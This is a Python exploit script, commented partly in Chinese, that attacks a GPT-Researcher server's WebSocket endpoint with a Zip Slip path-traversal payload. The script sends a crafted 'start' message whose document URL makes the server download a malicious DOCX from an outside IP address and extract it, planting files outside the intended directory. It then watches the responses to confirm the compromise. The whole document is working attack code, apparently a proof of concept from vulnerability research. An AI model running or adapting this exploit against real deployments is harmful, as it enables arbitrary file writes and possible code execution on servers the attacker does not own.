#!/usr/bin/env python3
"""
正确的exploit - 注意"start "后面有空格！
"""

import asyncio
import json
import websockets
import time

async def exploit():
    uri = "ws://localhost:8009/ws"
    malicious_url = "http://169.229.219.180:8888/malicious_document.docx"

    print("=" * 70)
    print("GPT-Researcher Zip Slip Exploit")
    print("=" * 70)
    print(f"\n[*] Target: {uri}")
    print(f"[*] Malicious DOCX: {malicious_url}")

    try:
        async with websockets.connect(uri, ping_interval=None) as ws:
            print("\n[✓] WebSocket connected")

            # Payload with malicious document_url
            payload = {
                "task": "Please analyze this document for me",
                "report_type": "research_report",
                "report_source": "hybrid",  # 使用hybrid确保会处理documents
                "source_urls": [],
                "document_urls": [malicious_url],  # ← 恶意URL
                "tone": "Objective",
                "headers": {},
                "query_domains": [],
                "mcp_enabled": False,
                "mcp_strategy": "fast",
                "mcp_configs": []
            }

            # 注意：必须是 "start " (有空格!)
            message = "start " + json.dumps(payload)
            print(f"\n[*] Sending exploit payload...")
            print(f"    Message length: {len(message)} bytes")
            await ws.send(message)
            print("[✓] Payload sent!")

            print("\n[*] Monitoring responses (this may take a while)...")
            print("[*] The server will:")
            print("    1. Download the malicious DOCX")
            print("    2. Extract it using UnstructuredWordDocumentLoader")
            print("    3. If vulnerable: PWNED files will be created\n")

            response_count = 0
            start_time = time.time()

            while True:
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=10.0)
                    response_count += 1

                    # Parse response
                    try:
                        data = json.loads(response)
                        msg_type = data.get('type', 'unknown')
                        content = str(data.get('content', ''))[:100]

                        timestamp = time.strftime('%H:%M:%S')
                        print(f"[{timestamp}] #{response_count} Type: {msg_type}")

                        if content:
                            print(f"           {content}")

                        # Check for completion
                        if msg_type == 'path':
                            print(f"\n[✓] Research completed!")
                            print(f"[*] Files: {data.get('output')}")
                            break

                        if msg_type == 'error':
                            print(f"\n[!] Error: {content}")
                            break

                    except json.JSONDecodeError:
                        print(f"    Non-JSON: {response[:100]}")

                except asyncio.TimeoutError:
                    elapsed = time.time() - start_time
                    print(f"[*] Waiting... ({elapsed:.0f}s elapsed)")

                    if elapsed > 180:  # 3 minutes timeout
                        print("\n[!] Timeout - stopping")
                        break

                except websockets.exceptions.ConnectionClosed:
                    print("\n[!] Connection closed")
                    break

            print(f"\n[*] Total responses: {response_count}")
            print(f"[*] Total time: {time.time() - start_time:.1f}s")

    except Exception as e:
        print(f"\n[✗] Error: {e}")
        import traceback
        traceback.print_exc()
        return False

    print("\n" + "=" * 70)
    print("EXPLOIT COMPLETE")
    print("=" * 70)
    print("\n[*] Next step: Verify if PWNED files exist")
    print("    Run: bash verify_vulnerability.sh")
    print("=" * 70)
    return True

if __name__ == "__main__":
    asyncio.run(exploit())
